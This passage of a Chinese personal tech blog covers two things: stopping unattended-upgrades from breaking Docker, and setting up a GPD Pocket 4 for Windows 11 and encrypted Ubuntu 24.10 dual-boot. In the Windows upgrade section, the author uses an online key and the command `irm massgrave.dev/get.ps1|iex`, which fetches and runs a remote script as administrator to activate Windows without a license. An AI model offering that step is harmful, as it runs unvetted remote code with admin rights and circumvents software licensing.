    <content><![CDATA[<p>服务器443端口突然停止服务，登上去看docker停止了，在&#x2F;var&#x2F;log下grep docker，查看<code>/var/log/syslog.*</code>、<code>/var/log/unattended-upgrades/unattended-upgrades.log</code>、<code>/var/log/apt/history.log</code>发现是因为unattended-upgrades服务升级导致的-_-!</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 87 Start-Date: 2021-07-27  06:42:24</span><br><span class="line"> 88 Commandline: /usr/bin/unattended-upgrade</span><br><span class="line"> 89 Upgrade: docker-doc:amd64 (19.03.6-0ubuntu1~18.04.2, 20.10.2-0ubuntu1~18.04.3)</span><br><span class="line"> 90 End-Date: 2021-07-27  06:42:33</span><br><span class="line"> 91</span><br><span class="line"> 92 Start-Date: 2021-07-27  06:42:41</span><br><span class="line"> 93 Commandline: /usr/bin/unattended-upgrade</span><br><span class="line"> 94 Upgrade: docker.io:amd64 (19.03.6-0ubuntu1~18.04.2, 20.10.2-0ubuntu1~18.04.3)</span><br><span class="line"> 95 End-Date: 2021-07-27  06:43:15</span><br><span class="line">...</span><br><span class="line">117 Start-Date: 2021-07-27  06:43:52</span><br><span class="line">118 Commandline: /usr/bin/unattended-upgrade</span><br><span class="line">119 Upgrade: runc:amd64 (1.0.0~rc93-0ubuntu1~18.04.2, 1.0.0~rc95-0ubuntu1~18.04.2)</span><br><span class="line">120 End-Date: 2021-07-27  06:43:54</span><br><span class="line">...</span><br><span class="line">127 Start-Date: 2021-07-27  06:44:04</span><br><span class="line">128 Commandline: /usr/bin/unattended-upgrade</span><br><span class="line">129 Upgrade: containerd:amd64 (1.3.3-0ubuntu1~18.04.2, 1.5.2-0ubuntu1~18.04.2)</span><br><span class="line">130 End-Date: 2021-07-27  06:44:16</span><br></pre></td></tr></table></figure>

<p>修改<code>/etc/apt/apt.conf.d/50unattended-upgrades</code>对docker相关的软件包加白</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20 // List of packages to not update (regexp are supported)</span><br><span class="line">21 Unattended-Upgrade::Package-Blacklist &#123;</span><br><span class="line">22 //  &quot;vim&quot;;</span><br><span class="line">23 //  &quot;libc6&quot;;</span><br><span class="line">24 //  &quot;libc6-dev&quot;;</span><br><span class="line">25 //  &quot;libc6-i686&quot;;</span><br><span class="line">26     &quot;docker*&quot;;</span><br><span class="line">27     &quot;containerd&quot;;</span><br><span class="line">28     &quot;runc&quot;;</span><br><span class="line">29 &#125;;</span><br></pre></td></tr></table></figure>

<p>或者配置apt将软件包设置为不更新（手动upgrade也不更新，不推荐）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用 apt</span></span><br><span class="line">apt-mark hold package_name  # 恢复 apt-mark unhold package_name </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用 dpkg</span></span><br><span class="line">echo &quot;package_name hold&quot; | sudo dpkg --set-selections  # 恢复 echo &quot;package_name install&quot; | sudo dpkg --set-selections</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用 aptitude</span></span><br><span class="line">aptitude hold package_name	# 恢复 aptitude unhold package_name </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看已经hold的软件包</span></span><br><span class="line">dpkg --get-selections | grep &quot;hold&quot; </span><br></pre></td></tr></table></figure>

<p>或者重新配置<code>unattended-upgrade</code>服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure unattended-upgrades</span><br></pre></td></tr></table></figure>

<p>或者直接关闭<code>unattended-upgrade</code>服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl status apt-daily-upgrade.timer</span><br><span class="line">systemctl stop apt-daily-upgrade.timer</span><br><span class="line">systemctl disable --now apt-daily-upgrade.timer</span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<p>或者卸载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt remove unattended-upgrades</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>vps</tag>
        <tag>tips</tag>
        <tag>ubuntu</tag>
        <tag>environment</tag>
      </tags>
  </entry>
  <entry>
    <title>GPD-Pocket 4 初始化记录</title>
    <url>/2025/02/16/2025-02-16/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>新年换新机，买了一台顶配 <span class="exturl" data-url="aHR0cHM6Ly9zb2Z0d2luY24uY29tL2dwZHBvY2tldDRjcw==" title="https://softwincn.com/gpdpocket4cs">GPD-Pocket4<i class="fa fa-external-link"></i></span> 替换掉之前的 GPD-Pocket3 作为手边的备机（KVM模块真香）, 正好把Windows&#x2F;Ubuntu系统一起升级一下。<span id="more"></span>看了一下屏幕原生还是祖传的竖屏（BIOS里是通过配置旋转来实现BIOS横屏的），和p3、壹号本3pro都一样，估计用了部分手机屏幕的芯片方案降低成本吧。</p>
<h1 id="Windows升级Win11专业版-基本配置"><a href="#Windows升级Win11专业版-基本配置" class="headerlink" title="Windows升级Win11专业版 &amp; 基本配置"></a>Windows升级Win11专业版 &amp; 基本配置</h1><h2 id="升级专业版"><a href="#升级专业版" class="headerlink" title="升级专业版"></a>升级专业版</h2><p>GPD预装系统是家庭版，RDP、BitLocker 之类的要啥啥没有。查了一下<ins>专业工作站版</ins>比<u>专业版</u>多了弹性文件系统(ReFS)功能，<u>用于检测镜像设备上的数据是否损坏并使用其他设备上的健康数据副本来修正和保护数据</u>，感觉个人机用处不是很大，换个专业版够了。参考<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82ODIyNzM1NTU=" title="https://zhuanlan.zhihu.com/p/682273555">知乎<i class="fa fa-external-link"></i></span>的专业版key升级一下，或者用自建<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1dpbmQ0L3ZsbWNzZA==" title="https://github.com/Wind4/vlmcsd">vlmcsd<i class="fa fa-external-link"></i></span>服务的方法定期认证一下也行。<br>查看原来的激活码&#x2F;密钥的几种方法（有些key看起来不一样）。</p>
<ol>
<li>管理员权限运行 <code>wmic path softwarelicensingservice get OA3xOriginalProductKey</code> ，这个貌似是OEM的，会被下面那个覆盖。（如果没装wmic需要在设置-&gt;系统-&gt;可选功能里添加wmic）。</li>
<li>注册表 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform</code> ， <code>BackupProductKeyDefault</code> 键（AIDA64软件里查看的貌似和这个一样）。</li>
</ol>
<p>使用网上的key的升级步骤如下：</p>
<ol>
<li>断网，设置-系统-激活-升级，输入激活码，电脑重启。</li>
<li>重启后，显示升级失败，联网，此时按下<kbd>&#8862; Win</kbd>键-windows管理工具-右键powershell-以管理员身份打开-输入 <code>irm massgrave.dev/get.ps1|iex</code> ，弹出窗口输入<code>1</code>，激活成功。</li>
</ol>
<h2 id="系统初始配置修改"><a href="#系统初始配置修改" class="headerlink" title="系统初始配置修改"></a>系统初始配置修改</h2><h3 id="Windows-杂项："><a href="#Windows-杂项：" class="headerlink" title="Windows 杂项："></a>Windows 杂项：</h3><h4 id="资源管理器配置："><a href="#资源管理器配置：" class="headerlink" title="资源管理器配置："></a>资源管理器配置：</h4><p>文件夹选项-&gt;查看，取消勾选“使用复选框以选择项”，取消勾选“隐藏已知文件类型的扩展名”，选择“显示隐藏的文件、文件夹和驱动器”。</p>
<h4 id="桌面图标修改："><a href="#桌面图标修改：" class="headerlink" title="桌面图标修改："></a>桌面图标修改：</h4><p>桌面右键-&gt;个性化-&gt;主题-&gt;桌面图标设定，勾选需要的图标。</p>
<h4 id="电源选项修改："><a href="#电源选项修改：" class="headerlink" title="电源选项修改："></a>电源选项修改：</h4><p>设置-&gt;系统-&gt;电源和电池，“电源模式”里，接通电源-最佳性能，使用电池-平衡，“屏幕、睡眠和休眠超时”里，把接通电源的睡眠关掉，其他随偏好。“节能模式”调个20%&#x2F;30%之类的，“盖子、电源和睡眠 按钮控件”里，把“按电源按钮”都调到“不执行任何操作”以防误触，把接通电源的盖上盖子调成不执行任何操作，其他随偏好。如果要更精细化的配置可以在控制面板里的电源里改（旧版UI）。</p>
<h4 id="远程桌面："><a href="#远程桌面：" class="headerlink" title="远程桌面："></a>远程桌面：</h4><p>设置-&gt;系统-&gt;远程桌面（打开）-&gt;勾选“要求设备使用网络级别身份验证连接”，改默认端口为自己偏好的端口号，改电脑名称。<br>如果端口改了没啥变化的话可以改注册表试试，路径 <code>HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</code> ，PortNumber(dword)改成偏好的十进制值。</p>
<h4 id="随机mac地址："><a href="#随机mac地址：" class="headerlink" title="随机mac地址："></a>随机mac地址：</h4><p>设置-&gt;网络和Internet-&gt;WLAN-&gt;打开“随机硬件地址”，家庭网络等个别WiFi需要手动在对应的网络配置文件里关闭随机MAC，以防DHCP地址变化。</p>
<h4 id="WSL2配置："><a href="#WSL2配置：" class="headerlink" title="WSL2配置："></a>WSL2配置：</h4><p>安装Windows Subsystem Linux，并设置默认版本为2（独立内核）<code>wsl --set-default-version 2</code>。</p>
<h4 id="管理员取得所有权选项："><a href="#管理员取得所有权选项：" class="headerlink" title="管理员取得所有权选项："></a>管理员取得所有权选项：</h4><p>保存以下内容为“管理员取得所有权.reg”，并双击导入注册表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\runas]</span><br><span class="line">@=&quot;管理员取得所有权&quot;</span><br><span class="line">&quot;NoWorkingDirectory&quot;=&quot;&quot;</span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\runas\command]</span><br><span class="line">@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;</span><br><span class="line">&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;</span><br><span class="line">[HKEY_CLASSES_ROOT\exefile\shell\runas2]</span><br><span class="line">@=&quot;管理员取得所有权&quot;</span><br><span class="line">&quot;NoWorkingDirectory&quot;=&quot;&quot;</span><br><span class="line">[HKEY_CLASSES_ROOT\exefile\shell\runas2\command]</span><br><span class="line">@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;</span><br><span class="line">&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;</span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\runas]</span><br><span class="line">@=&quot;管理员取得所有权&quot;</span><br><span class="line">&quot;NoWorkingDirectory&quot;=&quot;&quot;</span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\runas\command]</span><br><span class="line">@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; /r /d y &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F /t&quot;</span><br><span class="line">&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; /r /d y &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F /t&quot;</span><br></pre></td></tr></table></figure>
<h4 id="Copilot配置："><a href="#Copilot配置：" class="headerlink" title="Copilot配置："></a>Copilot配置：</h4><p>有好的线路的话，更改地区到新加坡，保存以下内容为“copilot_enable.reg”，并双击导入注册表，开启copilot（方法可能过时）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Copilot\BingChat]</span><br><span class="line">&quot;IsUserEligible&quot;=dword:00000001</span><br></pre></td></tr></table></figure>
<h4 id="磁盘分区调整："><a href="#磁盘分区调整：" class="headerlink" title="磁盘分区调整："></a>磁盘分区调整：</h4><p>安装<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGlza3Rvb2wuY24vZ28vZG93bmxvYWQvUEFJbnN0YWxsLnppcA==" title="https://www.disktool.cn/go/download/PAInstall.zip">分区助手<i class="fa fa-external-link"></i></span>或者类似的磁盘分区软件，调整一下分区，空出来1T左右或者其他大小的未分配空间给Ubuntu系统备用。</p>
<h4 id="（可选）rEFInder引导兼容设置："><a href="#（可选）rEFInder引导兼容设置：" class="headerlink" title="（可选）rEFInder引导兼容设置："></a>（可选）rEFInder引导兼容设置：</h4><p>由于rEFInd引导每次切系统会写引导区（<em>参考<span class="exturl" data-url="aHR0cHM6Ly93d3cucm9kc2Jvb2tzLmNvbS9yZWZpbmQvY29uZmlnZmlsZS5odG1sI2Jvb3RuZXh0" title="https://www.rodsbooks.com/refind/configfile.html#bootnext">1<i class="fa fa-external-link"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9zb3VyY2Vmb3JnZS5uZXQvcC9yZWZpbmQvZGlzY3Vzc2lvbi9nZW5lcmFsL3RocmVhZC81NTlmMTE3NC8jOTk5Zg==" title="https://sourceforge.net/p/refind/discussion/general/thread/559f1174/#999f">2<i class="fa fa-external-link"></i></span></em>），此时默认配置下的BitLocker会认为引导区改变已不可信任，存在安全风险，需要重新输入UUID解锁BitLocker。有两种方法可以让BitLocker保持SecureBoot自动解密磁盘：</p>
<p>(1). 在组策略里修改BitLocker的UEFI安全启动配置，运行（win+R）-&gt;gpedit.msc-&gt;计算机配置-&gt;管理模板-&gt;Windows组件-&gt;BitLocker驱动器加密-&gt;操作系统驱动器-&gt;为本地UEFI固件配置配置TPM平台验证配置文件，启用配置，左下选项勾选 PCR0、2、11，注意取消PCR7，应用&#x2F;确定（<span class="exturl" data-url="aHR0cHM6Ly9zdXBlcnVzZXIuY29tL3F1ZXN0aW9ucy8xNjQwOTg1L2hvdy10by1lbmFibGUtQml0TG9ja2VyLXdoZW4tYm9vdGluZy13aW5kb3dzLTEwLWZyb20tYS1ub24tbWljcm9zb2Z0LWJvb3QtbWFuYWdlLzE2NDEwMDAjMTY0MTAwMA==" title="https://superuser.com/questions/1640985/how-to-enable-BitLocker-when-booting-windows-10-from-a-non-microsoft-boot-manage/1641000#1641000">参考链接<i class="fa fa-external-link"></i></span>）。</p>
<p>(2). 在Ubuntu下rEFInd.conf里将Windows配置为<code>firmware_bootnum</code>方式启动（参考链接<span class="exturl" data-url="aHR0cHM6Ly93d3cucm9kc2Jvb2tzLmNvbS9yZWZpbmQvY29uZmlnZmlsZS5odG1sI2Jvb3RuZXh0" title="https://www.rodsbooks.com/refind/configfile.html#bootnext">1<i class="fa fa-external-link"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9iYnMuYXJjaGxpbnV4Lm9yZy92aWV3dG9waWMucGhwP3BpZD0xOTY3Mjc5I3AxOTY3Mjc5" title="https://bbs.archlinux.org/viewtopic.php?pid=1967279#p1967279">2<i class="fa fa-external-link"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9iYnMuYXJjaGxpbnV4Lm9yZy92aWV3dG9waWMucGhwP2lkPTI2NTM4NA==" title="https://bbs.archlinux.org/viewtopic.php?id=265384">3<i class="fa fa-external-link"></i></span>），这种方法等后面安装Ubuntu时再详细说明。</p>
<h4 id="BitLocker、还原点："><a href="#BitLocker、还原点：" class="headerlink" title="BitLocker、还原点："></a>BitLocker、还原点：</h4><p>等Ubuntu安装完了再配置。</p>
<h1 id="Ubuntu-24-10-安装"><a href="#Ubuntu-24-10-安装" class="headerlink" title="Ubuntu 24.10 安装"></a>Ubuntu 24.10 安装</h1><p>之前旧的gpd-pocket3参考了 <span class="exturl" data-url="aHR0cHM6Ly93d3cubWlrZWthc2JlcmcuY29tL2Jsb2cvMjAyMC8wNC8wOC9kdWFsLWJvb3QtdWJ1bnR1LWFuZC13aW5kb3dzLXdpdGgtZW5jcnlwdGlvbi5odG1s" title="https://www.mikekasberg.com/blog/2020/04/08/dual-boot-ubuntu-and-windows-with-encryption.html">这个方法<i class="fa fa-external-link"></i></span> 做了windows + ubuntu 双系统的全磁盘加密，这次装系统发现 <span class="exturl" data-url="aHR0cHM6Ly93d3cubWlrZWthc2JlcmcuY29tL2Jsb2cvMjAyNC8wNS8yMC9kdWFsLWJvb3QtdWJ1bnR1LTI0LTA0LWFuZC13aW5kb3dzLXdpdGgtZW5jcnlwdGlvbi5odG1s" title="https://www.mikekasberg.com/blog/2024/05/20/dual-boot-ubuntu-24-04-and-windows-with-encryption.html">参考博客有更新<i class="fa fa-external-link"></i></span> ，最新版的Ubuntu 24.10 GUI安装流程支持了双系统加密了，以下为用新方法安装Ubuntu24.10。</p>
<h2 id="安装Ubuntu并开启加密"><a href="#安装Ubuntu并开启加密" class="headerlink" title="安装Ubuntu并开启加密"></a>安装Ubuntu并开启加密</h2><ol>
<li>找个U盘刷入<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ZlbnRveS9WZW50b3k=" title="https://github.com/ventoy/Ventoy">Ventoy<i class="fa fa-external-link"></i></span>，然后从官网下载<span class="exturl" data-url="aHR0cHM6Ly9yZWxlYXNlcy51YnVudHUuY29tLzI0LjEwL3VidW50dS0yNC4xMC1kZXNrdG9wLWFtZDY0Lmlzbw==" title="https://releases.ubuntu.com/24.10/ubuntu-24.10-desktop-amd64.iso">Ubuntu-24.10-desktop-amd64.iso<i class="fa fa-external-link"></i></span>系统镜像并放入U盘。</li>
<li>重启到BIOS，从Ventoy引导，选择Ubuntu的镜像，把Ubuntu也安装成UEFI方案引导（安全启动必须）。</li>
<li><strong>开启LVM磁盘加密</strong>：<br> Ubuntu安装程序在加密双启动这块有一点误导性，需要一个小技巧来达成我们的目的。在GUI安装系统的流程中，选择语言、键盘、网络这些比较常规，选择交互式安装，当要进行磁盘安装时，先选择“<strong>擦除磁盘并安装Ubuntu</strong>(<strong>Erase disk and install Ubuntu</strong>)，点击<strong>高级功能</strong>(<strong>Advanced features</strong>)，选择<strong>使用LVM并加密</strong>(<strong>Use LVM and encryption</strong>)并点击OK结束高级功能的配置，在原来的界面上将选项调整为<strong>在Windows启动管理器之外安装Ubuntu</strong>(<strong>Install Ubuntu alongside Windows Boot Manager</strong>)，注意虽然<strong>高级选项变成灰色不可选</strong>，但是“<strong>使用LVM并加密</strong>(<strong>Use LVM and encryption</strong>)”仍然<strong>保持开启状态</strong>，用这个技巧就完成了使用LVM加密的高级功能，同时安装双系统启动（如下图）点击下一步，检查一下磁盘配置，继续完成剩下的常规安装步骤。</li>
</ol>
<img src="/2025/02/16/2025-02-16/installer_radio_buttons.png" class="">

<img src="/2025/02/16/2025-02-16/installer_ready.png" class="">
<center>从网上找的截图，**pocket4的安装略有区别**</center>

<h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><p>先在Ubuntu设置里面溜一圈，把一些有的没的按偏好调一调。</p>
<h3 id="远程桌面：-1"><a href="#远程桌面：-1" class="headerlink" title="远程桌面："></a>远程桌面：</h3><p>系统-&gt;远程桌面里，打开远程登录。这里“桌面共享”类似于mac的屏幕共享或者老的vnc（与物理屏幕共用session），远程登录类似于有独立session的mstsc，试了一下远程登录更好一点（除了经常需要额外输密码授权）。另外，相比22.04，24.10版本的远程桌面使用的是兼容RDP的协议，终于不用额外安装VNC了，试了一下还是挺稳定的，不知道是不是也用的GDI重绘技术。另外在“远程桌面”的同级菜单里把“安全外壳(ssh)”打开，不用手动安装openssh-server了。</p>
<p> 补充说明1：Ubuntu远程登录的默认端口也是3389，可以通过 <code>sudo grdctl --system rdp set-port &#123;YOUR_NEW_PORT&#125;; sudo systemctl restart gnome-remote-desktop.service</code> 修改为自己习惯的端口（十进制数字端口号替换命令中的YOUR_NEW_PORT）。<br> 补充说明2：mac版RDP客户端“Windows App”在连接pocket ubuntu时总是没法显示桌面，参考 <span class="exturl" data-url="aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy8xNTIxNzY0L3JkcC1ibGFjay1zY3JlZW4td2l0aC13aGl0ZS1jdXJzb3Itb24tMjQtMDRsdHM=" title="https://askubuntu.com/questions/1521764/rdp-black-screen-with-white-cursor-on-24-04lts">这个链接<i class="fa fa-external-link"></i></span> ，先在Windows App中右键点击pocket3导出rdp文件，编辑rdp文件，修改对应参数 <code>use redirection server name:i:1</code> 并保存，然后Windows App标题栏点 连接-&gt;从rdp文件导入 导入刚才修改后的rdp文件，新的rdp可以正常访问Ubuntu桌面了。</p>
<h3 id="隐藏BitLocker分区"><a href="#隐藏BitLocker分区" class="headerlink" title="隐藏BitLocker分区"></a>隐藏BitLocker分区</h3><p>桌面Dock上默认会显示Windows BitLocker分区，可以通过在设置-&gt;Ubuntu桌面-&gt;Configure Dock Behavior，取消“包括已卸载的卷”之前的钩，从而在Dock上隐藏windows的BitLocker卷（<span class="exturl" data-url="aHR0cHM6Ly93d3cub21ndWJ1bnR1LmNvLnVrLzIwMTkvMTEvaGlkZS1tb3VudGVkLWRyaXZlcy11YnVudHUtZG9jaw==" title="https://www.omgubuntu.co.uk/2019/11/hide-mounted-drives-ubuntu-dock">参考链接<i class="fa fa-external-link"></i></span>）。</p>
<img src="/2025/02/16/2025-02-16/hide_win_vol.jpg" class="">
<center>从网上找的截图，**pocket4的安装略有区别**</center>

<p>或者，在系统全局隐藏BitLocker卷（Ubuntu资源管理器里也看不到），按以下方法实现（<span class="exturl" data-url="aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy8xMjQwOTQvaG93LXRvLWhpZGUtYW4tbnRmcy1wYXJ0aXRpb24tZnJvbS11YnVudHU=" title="https://askubuntu.com/questions/124094/how-to-hide-an-ntfs-partition-from-ubuntu">参考链接<i class="fa fa-external-link"></i></span>）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 目前分区结构如下：</span><br><span class="line">root@pocket:~# fdisk -l /dev/nvme0n1</span><br><span class="line">Disk /dev/nvme0n1：1.82 TiB，2000398934016 字节，3907029168 个扇区</span><br><span class="line">Disk model: WD Blue SN580 2TB</span><br><span class="line">单元：扇区 / 1 * 512 = 512 字节</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line">磁盘标签类型：gpt</span><br><span class="line">磁盘标识符：********-****-****-****-************</span><br><span class="line"></span><br><span class="line">设备                 起点       末尾       扇区   大小 类型</span><br><span class="line">/dev/nvme0n1p1       2048     206847     204800   100M EFI 系统</span><br><span class="line">/dev/nvme0n1p2     206848     468991     262144   128M Microsoft 保留</span><br><span class="line">/dev/nvme0n1p3     468992  629614591  629145600   300G Microsoft 基本数据</span><br><span class="line">/dev/nvme0n1p4  629614592 1936989179 1307374588 623.4G Microsoft 基本数据</span><br><span class="line">/dev/nvme0n1p5 3873474560 3907028991   33554432    16G Windows 恢复环境</span><br><span class="line">/dev/nvme0n1p6 1936990208 1941184511    4194304     2G Linux 文件系统</span><br><span class="line">/dev/nvme0n1p7 1941184512 3873474559 1932290048 921.4G Linux 文件系统</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">需要隐藏的分区为 /dev/nvme0n1p3 和 /dev/nvme0n1p4</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /etc/udev/rules.d/99-hide-windows-bitlocker-partitions.rules</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 如果使用PARTUUID方法，需要自行修改对应的UUID，use blkid to see UUIDs</span></span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># hide /dev/nvme0n1p2 &quot;Microsoft reserved partition&quot; PARTUUID=&quot;11111111-1111-1111-1111-111111111111&quot; IdUUID=&quot;&quot; from `udisksctl info -b /dev/nvme0n1p2` so use PARTUUID</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">SUBSYSTEM==<span class="string">&quot;block&quot;</span>, ENV&#123;ID_FS_UUID&#125;==<span class="string">&quot;11111111-1111-1111-1111-111111111111&quot;</span>, ENV&#123;UDISKS_IGNORE&#125;=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## hide /dev/nvme0n1p3 &quot;Windows BitLocker partition1&quot; PARTUUID=&quot;22222222-2222-2222-2222-222222222222&quot; IdUUID=&quot;33333333-3333-3333-3333-333333333333&quot;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#SUBSYSTEM==&quot;block&quot;, ENV&#123;ID_FS_UUID&#125;==&quot;22222222-2222-2222-2222-222222222222&quot;, ENV&#123;UDISKS_IGNORE&#125;=&quot;1&quot;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## hide /dev/nvme0n1p4 &quot;Windows BitLocker partition2&quot; PARTUUID=&quot;44444444-4444-4444-4444-444444444444&quot; IdUUID=&quot;55555555-5555-5555-5555-555555555555&quot;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#SUBSYSTEM==&quot;block&quot;, ENV&#123;ID_FS_UUID&#125;==&quot;44444444-4444-4444-4444-444444444444&quot;, ENV&#123;UDISKS_IGNORE&#125;=&quot;1&quot;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># hide /dev/nvme0n1p5 &quot;Windows Recovery partition&quot;   PARTUUID=&quot;66666666-6666-6666-6666-666666666666&quot; IdUUID=&quot;7777777777777777&quot;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">SUBSYSTEM==<span class="string">&quot;block&quot;</span>, ENV&#123;ID_FS_UUID&#125;==<span class="string">&quot;7777777777777777&quot;</span>, ENV&#123;UDISKS_IGNORE&#125;=<span class="string">&quot;1&quot;</span></span></span><br><span class="line">KERNEL==&quot;nvme0n1p3&quot;, ENV&#123;UDISKS_IGNORE&#125;=&quot;1&quot;</span><br><span class="line">KERNEL==&quot;nvme0n1p4&quot;, ENV&#123;UDISKS_IGNORE&#125;=&quot;1&quot;</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新加载udev rules</span></span><br><span class="line">udevadm control --reload</span><br><span class="line">udevadm trigger --subsystem-match=block</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">see <span class="keyword">if</span> Ignored</span></span><br><span class="line">for i in `seq 1 7`;do echo -n &quot;nvme0n1p$&#123;i&#125;:&quot;;udisksctl info -b /dev/nvme0n1p$&#123;i&#125;|grep &quot;HintIgnore&quot;;done</span><br></pre></td></tr></table></figure>

<h2 id="其他命令行杂项"><a href="#其他命令行杂项" class="headerlink" title="其他命令行杂项"></a>其他命令行杂项</h2><h3 id="shell命令汇总"><a href="#shell命令汇总" class="headerlink" title="shell命令汇总"></a>shell命令汇总</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">环境变量及rc文件初始化略过</span></span><br><span class="line">apt update &amp;&amp; apt upgrade -y &amp;&amp; apt install -y vim tmux locale fonts-unifont unifont fbterm ncdu lm-sensors iotop iftop htop autoconf g++ make dconf-editor mesa-utils rocm-smi libdrm-dev radeontop conntrack &quot;linux-headers-$(uname -r)&quot; &quot;linux-modules-extra-$(uname -r)&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加入一些组，fbterm 需要在video组里</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;Can&#x27;t open the framebuffer device&quot;</span> Error occured, /dev/fb0 is owned by root/video, add user to video group.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ref:https://dingyichen.wordpress.com/2009/12/21/fbterm-cant-open-framebuffer-device/</span></span><br><span class="line">usermod -aG plugdev,dialout,render,video king</span><br><span class="line">setcap &#x27;cap_sys_tty_config+ep&#x27; /usr/bin/fbterm</span><br><span class="line">cat &lt;&lt; EOF &gt; /root/.fbtermrc</span><br><span class="line">font-names=Ubuntu Mono</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">font-names=Terminus</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">screen-rotate=3</span></span><br><span class="line">font-size=64</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以上.fbtermrc 记得给user也复制一份，用于<span class="built_in">tty</span>终端显示中文</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意fbterm未启动前<span class="built_in">tty</span>字体可能比较小，修改 /etc/default/console-setup 文件中的以下参数：</span></span><br><span class="line">cat &lt;&lt; EOF &gt;&gt; /etc/default/console-setup</span><br><span class="line">FONTFACE=&quot;TerminusBold&quot;</span><br><span class="line">FONTSIZE=&quot;16x32&quot;</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启rc.local自启动脚本</span></span><br><span class="line">chmod +x /etc/rc.local &amp;&amp; systemctl enable rc-local &amp;&amp; systemctl start rc-local</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span 